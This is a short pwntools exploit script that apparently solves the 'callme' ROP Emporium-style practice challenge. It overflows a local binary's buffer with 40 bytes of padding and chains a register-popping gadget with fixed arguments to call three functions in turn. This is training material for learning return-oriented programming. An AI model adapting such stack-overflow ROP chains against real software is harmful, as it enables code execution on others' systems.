#!/bin/python3

from pwn import *

programm = "./callme"

p = process(programm)
elf = ELF(programm)
p.recvuntil(">")

# Functions
callme_one = p64(0x00400720)
callme_two = p64(0x00400740)
callme_three = p64(0x004006f0)

# Function params
params = p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d)

# pop 3 registers
popall = p64(0x0040093c) 

payload = b""
payload += b"A" * 40 # padding

# Call Functions
payload += popall
payload += params
payload += callme_one

payload += popall
payload += params
payload += callme_two

payload += popall
payload += params
payload += callme_three

p.sendline(payload)

print(p.recvall())
